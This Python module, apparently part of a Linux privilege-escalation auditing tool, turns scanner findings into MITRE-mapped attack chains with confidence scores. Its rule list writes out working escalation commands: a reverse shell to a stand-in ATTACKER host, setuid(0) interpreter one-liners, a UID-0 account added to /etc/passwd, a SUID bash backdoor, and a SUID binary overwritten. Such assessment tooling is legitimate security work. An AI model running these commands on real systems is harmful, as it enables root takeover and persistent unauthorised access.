#!/usr/bin/env python3
"""
  COSVINTE — Attack Chain Builder

  Analyses findings from all scanners and constructs realistic
  multi-step attack chains with MITRE ATT&CK mapping,
  confidence scoring, and memory-protection awareness.
"""

import os
from datetime import datetime

from core.utils import Color, c, severity_badge, print_banner as _print_banner


# ══════════════════════════════════════════════════════════════════
#  CHAIN RULE DEFINITIONS
# ══════════════════════════════════════════════════════════════════
CHAIN_RULES = [
    {
        "id":               "CHAIN-001",
        "name":             "Cron Job + Writable Script Execution",
        "description":      (
            "A cron job executed as root runs a script stored in a world-writable "
            "directory. An attacker can append a reverse shell to the script and wait "
            "for the cron cycle to obtain a root shell."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  90,
        "required_sources": ["cron", "writable"],
        "steps": [
            "Find root cron jobs: crontab -l && ls -la /etc/cron.*",
            "Verify the script is writable: ls -la <script_path>",
            "Append a reverse shell: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> <script>",
            "Wait for the cron cycle to execute the script.",
            "Catch the shell: nc -lvnp 4444  →  ROOT SHELL",
        ],
        "mitre": "T1053.003",
        "conditions": [
            {"source": "cron",     "field": "category", "match": "any"},
            {"source": "writable", "field": "path",     "match": "any"},
        ],
    },
    {
        "id":               "CHAIN-002",
        "name":             "Writable PATH Dir + Cron Command Hijack",
        "description":      (
            "A world-writable directory appears in $PATH and a cron job invokes a "
            "command without an absolute path. Placing a malicious binary in that "
            "directory causes cron to execute it as root."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  85,
        "required_sources": ["path", "cron"],
        "steps": [
            "Check $PATH for writable dirs: echo $PATH; ls -ld <dir>",
            "Find relative cron commands: grep -r '' /etc/cron.* | grep -v '/'",
            "Place malicious binary: echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /writable_dir/<cmd> && chmod +x ...",
            "Wait for cron to run the hijacked command.",
            "/bin/bash -p  →  ROOT SHELL",
        ],
        "mitre": "T1574.007",
        "conditions": [
            {"source": "path", "field": "world_writable", "match": "true"},
            {"source": "cron", "field": "category",       "match": "any"},
        ],
    },
    {
        "id":               "CHAIN-003",
        "name":             "Dangerous Capability on Interpreter",
        "description":      (
            "A scripting interpreter (Python, Perl, Ruby, Node) has cap_setuid or "
            "cap_sys_admin set. A one-liner can call setuid(0) and drop into a root "
            "shell without requiring SUID bits."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  95,
        "required_sources": ["caps"],
        "steps": [
            "Confirm the capability: getcap <binary_path>",
            "Python: <binary> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "Perl:   <binary> -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'",
            "Ruby:   <binary> -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
            "→  ROOT SHELL obtained immediately",
        ],
        "mitre": "T1548.001",
        "conditions": [
            {"source": "caps", "field": "is_interpreter", "match": "true"},
            {"source": "caps", "field": "capability",     "match": "contains_any",
             "values": ["cap_setuid", "cap_sys_admin", "cap_setgid"]},
        ],
    },
    {
        "id":               "CHAIN-004",
        "name":             "Writable /etc/passwd — Add Root Account",
        "description":      (
            "The /etc/passwd (or /etc/shadow) file is world-writable. An attacker "
            "can add a new UID-0 user with a known password and su directly to root."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  99,
        "required_sources": ["writable"],
        "steps": [
            "Confirm write access: ls -la /etc/passwd",
            "Generate a password hash: openssl passwd -1 -salt xyz P@ssword123",
            "Append a root-level user: echo 'hacker:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd",
            "Switch to the new user: su hacker  →  ROOT SHELL",
        ],
        "mitre": "T1136.001",
        "conditions": [
            {"source": "writable", "field": "path", "match": "path_contains",
             "values": ["/etc/passwd", "/etc/shadow"]},
        ],
    },
    {
        "id":               "CHAIN-005",
        "name":             "Kernel Exploit + Weakened Memory Protections",
        "description":      (
            "A known-vulnerable kernel CVE is present and memory protections such as "
            "ASLR are disabled or partial. A compiled PoC exploit can reliably obtain "
            "a root shell."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  75,
        "required_sources": ["kernel"],
        "steps": [
            "Note the kernel version: uname -r",
            "Check ASLR: cat /proc/sys/kernel/randomize_va_space  (0 = disabled)",
            "Check SMEP: grep -m1 flags /proc/cpuinfo | grep smep",
            "Download a matching PoC from exploit-db for the CVE.",
            "Compile and run: gcc exploit.c -o pwn && ./pwn  →  ROOT SHELL",
        ],
        "mitre": "T1068",
        "conditions": [
            {"source": "kernel", "field": "status", "match": "equals",
             "values": ["VULNERABLE"]},
        ],
    },
    {
        "id":               "CHAIN-006",
        "name":             "SUID Binary + Writable Library Directory",
        "description":      (
            "A SUID binary loads a shared library from a directory that is "
            "world-writable. Placing a malicious .so in that directory causes the "
            "SUID binary to execute attacker code as root."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  78,
        "required_sources": ["path", "writable"],
        "steps": [
            "Find SUID binaries: find / -perm -4000 -type f 2>/dev/null",
            "Check shared library paths: ldd <binary> — look for writable dirs",
            "Compile a malicious .so: gcc -shared -fPIC -o /writable_dir/target.so payload.c",
            "Run the SUID binary — the .so is loaded as root  →  ROOT SHELL",
        ],
        "mitre": "T1574.006",
        "conditions": [
            {"source": "path",     "field": "dangerous", "match": "true"},
            {"source": "writable", "field": "path",      "match": "any"},
        ],
    },
    {
        "id":               "CHAIN-007",
        "name":             "cap_dac_override + Overwrite SUID Binary",
        "description":      (
            "A binary with cap_dac_override can bypass DAC permission checks. "
            "Combined with a writable copy of a SUID binary path, the attacker "
            "can replace system SUID binaries with a payload."
        ),
        "severity":         "CRITICAL",
        "base_confidence":  82,
        "required_sources": ["caps", "path"],
        "steps": [
            "Confirm cap_dac_override: getcap <binary>",
            "Identify a target SUID binary: find / -perm -4000 2>/dev/null",
            "Prepare payload: echo -e '#!/bin/bash\\nbash -p' > /tmp/payload && chmod +x /tmp/payload",
            "Overwrite the SUID binary: <cap_binary> cp /tmp/payload /usr/bin/passwd",
            "Execute /usr/bin/passwd  →  ROOT SHELL",
        ],
        "mitre": "T1574.010",
        "conditions": [
            {"source": "caps", "field": "capability", "match": "contains_any",
             "values": ["cap_dac_override", "cap_dac_read_search"]},
            {"source": "path", "field": "dangerous",  "match": "true"},
        ],
    },
    {
        "id":               "CHAIN-008",
        "name":             "Relative PATH Entry + SUID Subcommand Hijack",
        "description":      (
            "A relative entry (e.g., '.') appears in $PATH before standard directories. "
            "A SUID binary calls a subcommand by relative name, so placing a malicious "
            "script in the current directory hijacks execution as root."
        ),
        "severity":         "HIGH",
        "base_confidence":  70,
        "required_sources": ["path"],
        "steps": [
            "Verify relative $PATH entry: echo $PATH  (look for '.' or paths not starting with '/')",
            "Find SUID binaries using relative subcommands: strings <suid_binary> | grep -v '/' | grep -E '^[a-z]'",
            "Create a malicious script in CWD: echo -e '#!/bin/bash\\nbash -p' > ./<cmd> && chmod +x ./<cmd>",
            "Run the SUID binary from that directory  →  ROOT SHELL",
        ],
        "mitre": "T1574.007",
        "conditions": [
            {"source": "path", "field": "relative",  "match": "true"},
            {"source": "path", "field": "dangerous", "match": "true"},
        ],
    },
]


# ══════════════════════════════════════════════════════════════════
#  MEMORY PROTECTION CHECK
# ══════════════════════════════════════════════════════════════════

def check_memory_protections() -> dict:
    """Read ASLR, SMEP, SMAP, and NX state from /proc."""
    result = {}

    try:
        with open("/proc/sys/kernel/randomize_va_space") as fh:
            aslr_val = int(fh.read().strip())
        result["aslr"] = {
            "value":      aslr_val,
            "status":     "enabled" if aslr_val == 2 else ("partial" if aslr_val == 1 else "disabled"),
            "risk_bonus": 0.0 if aslr_val == 2 else (0.5 if aslr_val == 1 else 1.5),
        }
    except Exception:
        result["aslr"] = {"value": "unknown", "status": "unknown", "risk_bonus": 0.3}

    try:
        with open("/proc/cpuinfo") as fh:
            flags_line = next((ln for ln in fh if ln.startswith("flags")), "")
        result["smep"] = {"enabled": "smep" in flags_line}
        result["smap"] = {"enabled": "smap" in flags_line}
        result["nx"]   = {"enabled": "nx"   in flags_line}
    except Exception:
        for key in ("smep", "smap", "nx"):
            result[key] = {"enabled": "unknown"}

    return result


# ══════════════════════════════════════════════════════════════════
#  CONDITION EVALUATOR
# ══════════════════════════════════════════════════════════════════

def _eval_condition(cond: dict, findings_by_source: dict) -> tuple:
    """Evaluate a single chain condition against collected findings.

    Returns:
        (matched: bool, matched_items: list)
    """
    source = cond["source"]
    field  = cond["field"]
    match  = cond["match"]
    values = cond.get("values", [])
    items  = findings_by_source.get(source, [])

    matched = []
    for item in items:
        val = item.get(field)
        if match == "any":
            matched.append(item)
        elif match == "true":
            if val is True or val == 1:
                matched.append(item)
        elif match == "equals":
            if str(val) in [str(v) for v in values]:
                matched.append(item)
        elif match == "contains_any":
            if val and any(v.lower() in str(val).lower() for v in values):
                matched.append(item)
        elif match == "path_contains":
            if val and any(v in str(val) for v in values):
                matched.append(item)

    return len(matched) > 0, matched


# ══════════════════════════════════════════════════════════════════
#  CONFIDENCE CALCULATOR
# ══════════════════════════════════════════════════════════════════

def _calc_confidence(rule: dict, matched_map: dict, mem: dict) -> int:
    """Adjust base confidence based on evidence coverage and memory protections."""
    score = rule["base_confidence"]

    if all(s in matched_map for s in rule["required_sources"]):
        score = min(score + 5, 99)

    if "kernel" in rule["required_sources"]:
        aslr_status = mem.get("aslr", {}).get("status", "unknown")
        if aslr_status == "disabled":  score = min(score + 20, 99)
        elif aslr_status == "partial": score -= 5
        elif aslr_status == "enabled": score -= 15

    missing = [s for s in rule["required_sources"] if s not in matched_map]
    score  -= len(missing) * 15

    return max(min(score, 99), 5)


# ══════════════════════════════════════════════════════════════════
#  CORE CHAIN BUILDER
# ══════════════════════════════════════════════════════════════════

def build_chains(reports: dict) -> list:
    """Build attack chains from a dict of scanner report dicts.

    Args:
        reports: Keys are scanner keys (caps/cron/kernel/path/writable),
                 values are their report dicts (may include context_scoring).

    Returns:
        Sorted list of matched chain dicts (CRITICAL first, then by confidence).
    """
    fbs: dict = {}   # findings_by_source

    if reports.get("caps"):
        fbs["caps"] = reports["caps"].get("findings", [])

    if reports.get("cron"):
        fbs["cron"] = reports["cron"].get("findings", [])

    if reports.get("kernel"):
        fbs["kernel"] = reports["kernel"].get("findings", [])

    if reports.get("path"):
        path_items = []
        for item in reports["path"].get("path_analysis", []):
            item.setdefault("_origin", "path_analysis")
            path_items.append(item)
        for item in reports["path"].get("suid_binaries", []):
            item.setdefault("_origin", "suid")
            path_items.append(item)
        fbs["path"] = path_items

    if reports.get("writable"):
        fbs["writable"] = reports["writable"].get("writable_paths", [])

    mem    = check_memory_protections()
    chains = []

    for rule in CHAIN_RULES:
        matched_map: dict = {}
        for cond in rule["conditions"]:
            met, items = _eval_condition(cond, fbs)
            if met:
                src      = cond["source"]
                existing = matched_map.get(src, [])
                for it in items:
                    key = str(it.get("cve") or it.get("path") or it.get("binary") or id(it))
                    already = any(
                        str(e.get("cve") or e.get("path") or e.get("binary") or id(e)) == key
                        for e in existing
                    )
                    if not already:
                        existing.append(it)
                matched_map[src] = existing

        # Require at least one required source to be present in the reports
        if not any(s in matched_map for s in rule["required_sources"] if s in reports):
            continue

        chains.append({
            "id":           rule["id"],
            "name":         rule["name"],
            "description":  rule["description"],
            "severity":     rule["severity"],
            "confidence":   _calc_confidence(rule, matched_map, mem),
            "mitre":        rule["mitre"],
            "steps":        rule["steps"],
            "evidence":     matched_map,
            "sources_used": list(matched_map.keys()),
            "mem_protections": mem,
        })

    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    chains.sort(key=lambda x: (sev_order.get(x["severity"], 9), -x["confidence"]))
    return chains


# ══════════════════════════════════════════════════════════════════
#  PRETTY PRINT
# ══════════════════════════════════════════════════════════════════

def _confidence_bar(conf: int, width: int = 20) -> str:
    filled = int((conf / 100.0) * width)
    bar    = "█" * filled + "░" * (width - filled)
    col    = (Color.RED + Color.BOLD if conf >= 85
              else (Color.YELLOW if conf >= 60 else Color.GREEN))
    return f"{col}{bar}{Color.RESET} {Color.BOLD}{conf}%{Color.RESET}"


def print_banner() -> None:
    _print_banner('Attack Chain Builder  |  "Conquer Vulnerabilities"')


def print_mem_protections(mem: dict) -> None:
    print(c(Color.CYAN + Color.BOLD,
            "  ╔══ MEMORY PROTECTIONS ══════════════════════════════════════╗"))
    aslr   = mem.get("aslr", {})
    status = aslr.get("status", "unknown")
    col    = (Color.GREEN if status == "enabled"
              else (Color.YELLOW if status == "partial" else Color.RED))
    print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,'ASLR   :')} "
          f"{c(col + Color.BOLD, status.upper())}  "
          f"{c(Color.GRAY, '(value=' + str(aslr.get('value','?')) + ', 2=full 1=partial 0=disabled)')}")
    for key in ("smep", "smap", "nx"):
        val   = mem.get(key, {}).get("enabled", "unknown")
        col   = Color.GREEN if val is True else (Color.RED if val is False else Color.GRAY)
        label = "ENABLED" if val is True else ("DISABLED" if val is False else "UNKNOWN")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY, f'{key.upper():<6}:')} {c(col + Color.BOLD, label)}")
    print(c(Color.CYAN + Color.BOLD,
            "  ╚══════════════════════════════════════════════════════════════╝\n"))


def print_chains(chains: list) -> None:
    if not chains:
        print(c(Color.GREEN + Color.BOLD, "\n  ✔  No attack chains detected.\n"))
        return

    crit = sum(1 for ch in chains if ch["severity"] == "CRITICAL")
    high = sum(1 for ch in chains if ch["severity"] == "HIGH")
    print(c(Color.RED + Color.BOLD,
            f"\n  ⚡  {len(chains)} Attack Chain(s) detected  "
            f"({crit} CRITICAL · {high} HIGH)\n"))

    for idx, chain in enumerate(chains, 1):
        sev     = chain["severity"]
        conf    = chain["confidence"]
        hdr_col = (Color.BG_RED + Color.BOLD if sev == "CRITICAL"
                   else Color.RED + Color.BOLD)

        divider   = "═" * 52
        chain_id  = chain["id"]
        hdr_label = f"╔══ CHAIN #{idx}  {chain_id} {divider}"
        print(f"  {c(hdr_col, hdr_label)}")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.BOLD + Color.WHITE, chain['name'])}")
        print(f"  {c(Color.CYAN,'║')}")
        print(f"  {c(Color.CYAN,'║')}  Severity   : {severity_badge(sev)}  "
              f"│  Confidence : {_confidence_bar(conf)}")
        print(f"  {c(Color.CYAN,'║')}  MITRE ATT&CK: {c(Color.BLUE, chain['mitre'])}  "
              f"│  Sources : {c(Color.MAGENTA, ', '.join(chain['sources_used']))}")
        print(f"  {c(Color.CYAN,'║')}")

        # Description (word-wrap at 68 chars)
        print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY, '📋  Description:')}")
        words, line = chain["description"].split(), ""
        for word in words:
            if len(line) + len(word) + 1 > 68:
                print(f"  {c(Color.CYAN,'║')}      {c(Color.WHITE, line)}")
                line = word
            else:
                line = f"{line} {word}".strip()
        if line:
            print(f"  {c(Color.CYAN,'║')}      {c(Color.WHITE, line)}")

        # Exploit steps
        print(f"  {c(Color.CYAN,'║')}")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.YELLOW + Color.BOLD, '⚡  Exploit Steps:')}")
        for i, step in enumerate(chain["steps"], 1):
            lines = step.split("\n")
            print(f"  {c(Color.CYAN,'║')}    {c(Color.ORANGE, str(i)+'.')} {c(Color.GRAY, lines[0])}")
            for extra in lines[1:]:
                print(f"  {c(Color.CYAN,'║')}       {c(Color.GRAY, extra.strip())}")

        # Evidence
        print(f"  {c(Color.CYAN,'║')}")
        print(f"  {c(Color.CYAN,'║')}  {c(Color.GREEN, '🔍  Evidence:')}")
        for src, items in chain["evidence"].items():
            for item in items[:2]:
                label    = (item.get("cve") or item.get("binary")
                            or item.get("path") or str(item)[:40])
                sev_item = item.get("severity", item.get("status", ""))
                print(f"  {c(Color.CYAN,'║')}    {c(Color.GRAY, f'[{src}]')} "
                      f"{c(Color.WHITE, str(label))}  "
                      f"{c(Color.YELLOW, sev_item) if sev_item else ''}")
            if len(items) > 2:
                print(f"  {c(Color.CYAN,'║')}    {c(Color.GRAY, f'... and {len(items)-2} more')}")

        print(f"  {c(hdr_col, '╚' + '═' * 62)}\n")


def print_summary(chains: list) -> None:
    if not chains:
        return
    crit     = sum(1 for ch in chains if ch["severity"] == "CRITICAL")
    high     = sum(1 for ch in chains if ch["severity"] == "HIGH")
    avg_conf = int(sum(ch["confidence"] for ch in chains) / len(chains))
    print(f"\n{c(Color.CYAN + Color.BOLD, '  ╔══ ATTACK CHAIN SUMMARY ══════════════════════════════════════╗')}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,'Total Chains Detected :')} {c(Color.WHITE + Color.BOLD, str(len(chains)))}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.BG_RED + Color.BOLD,'  CRITICAL             :')} {c(Color.RED + Color.BOLD, str(crit))}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.RED,   '  HIGH                 :')} {c(Color.RED + Color.BOLD, str(high))}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.GRAY,  'Avg Confidence        :')} {c(Color.YELLOW + Color.BOLD, f'{avg_conf}%')}")
    print(f"  {c(Color.CYAN,'║')}")
    print(f"  {c(Color.CYAN,'║')}  {c(Color.YELLOW, '⚠  See Remediation Roadmap to neutralise these chains.')}")
    print(c(Color.CYAN + Color.BOLD, '  ╚══════════════════════════════════════════════════════════════╝\n'))


def chains_to_report_dict(chains: list) -> list:
    """Serialise chain list for JSON embedding in the combined report."""
    result = []
    for ch in chains:
        entry = {k: v for k, v in ch.items() if k not in ("evidence", "mem_protections")}
        entry["evidence_summary"] = {
            src: [
                str(it.get("cve") or it.get("binary") or it.get("path") or "")
                for it in items[:3]
            ]
            for src, items in ch.get("evidence", {}).items()
        }
        result.append(entry)
    return result
